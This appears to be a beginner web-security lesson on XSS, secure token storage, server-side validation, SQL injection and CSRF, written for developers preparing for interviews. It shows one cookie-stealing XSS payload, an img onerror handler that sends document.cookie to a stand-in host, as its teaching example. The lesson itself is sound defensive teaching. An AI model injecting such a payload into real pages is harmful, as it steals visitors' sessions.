Security Basics

The three words that appear in every security discussion: XSS, and trusting no one.

In plain words The core rule of web security is one sentence: never trust input — not from users, not from URLs, not from other websites, not from your own database if users ever wrote to it. Everything below is that rule applied to specific doors. The most famous door is XSS: an attacker smuggling code into your page disguised as data.

1.Read the concept

XSS — data pretending to be code

Your comment section displays whatever users type. A user "types" this:

<img src=x onerror="fetch('https://evil.com?cookie=' + document.cookie)">

If your page inserts that into the DOM as HTML — via innerHTML — the browser executes it: the image fails to load, onerror fires, and the visitor's cookies are shipped to the attacker. Every visitor who views that comment gets attacked. The comment was data, but innerHTML treated it as code — that gap is XSS (Cross-Site Scripting), and it's consistently among the most common real-world vulnerabilities.

The one-line defense User data goes into the DOM through textContent — which treats everything as text, executing nothing. innerHTML is for HTML you wrote, never for HTML a user touched. (Frameworks like React escape by default — and dangerouslySetInnerHTML is named that way for a reason.)

Where secrets live — the token question

You've met this in the storage lesson; security is where it becomes doctrine:

  • localStorage is readable by any script on the page. One XSS anywhere — yours, or a compromised npm package — and localStorage.getItem("token") hands over the session.
  • HttpOnly cookies are invisible to JavaScript. The browser stores and sends them, but no script can read them — XSS can't steal what it can't touch.
  • So the modern pattern: sessions in HttpOnly, Secure, SameSite cookies; localStorage reserved for non-secret data (themes, UI state).

The rest of the starter kit

  • Validate on the server, always. Client-side validation is UX; server-side validation is security. Anyone can send crafted requests with curl — the browser is not the gatekeeper.
  • Never build queries by string-concatenating user input (SQL injection's front door) — parameterized queries only.
  • Least exposure: store what you need, expire it, scope it. A cookie for "admin" that lives 30 days on every path is an attack surface with a bow on it.
  • Dependencies are an attack surface too — you ship every npm package's code; audits (npm audit) and lock files are security tools.

Exceptions & traps — the complete list

  • Escaping must happen in the right direction — data inserted into HTML needs HTML-escaping; into URLs, URL-encoding; into SQL, parameterization. One "escape everything" function isn't a thing.
  • XSS survives the database — the payload stored years ago attacks every future visitor (stored XSS), so "the data is already in the DB" is not a defense.
  • Framework ≠ immunity — React escapes text by default, but href={userInput} with a javascript: URL, or dangerouslySetInnerHTML, reopens the door.
  • HttpOnly ≠ CSRF-proof — cookies are sent automatically on requests, which is exactly what CSRF attacks abuse; SameSite cookies and CSRF tokens are the defense. Different door, different lock.
  • "Hidden" is not "secure" — hiding API keys in frontend code, obfuscating endpoints, or disabling the "inspect" menu protects nothing; the browser is fully visible to whoever runs it.
  • Frontend checks are UX only — disabling a button stops honest users, not attackers sending crafted requests directly. The server re-checks everything.
  • Dependency code runs in your page — an npm package with 4 weekly downloads can exfiltrate data; supply-chain attacks are real, so lock files and audits matter.

3.Practice — answer before you click

4.Prove it

Your interview answer — rehearse out loud, recorded, no notes "The core rule is: never trust input — user text, URLs, third-party data, even my own database if users wrote into it. The flagship attack is XSS: user data inserted as HTML through innerHTML gets executed by the browser — a fake img tag's onerror can ship everyone's cookies to an attacker. The defense is inserting user data through textContent, which renders it as inert text, and frameworks help by escaping by default. For secrets, I keep sessions in HttpOnly Secure cookies — invisible to JavaScript, so XSS can't steal them — and never store tokens in localStorage. And I know client-side validation is UX, not security: the server re-validates everything, because anyone can send crafted requests directly."

The rule → XSS mechanism → the two doors → secrets → server-side truth. That's the complete junior-to-mid security answer.
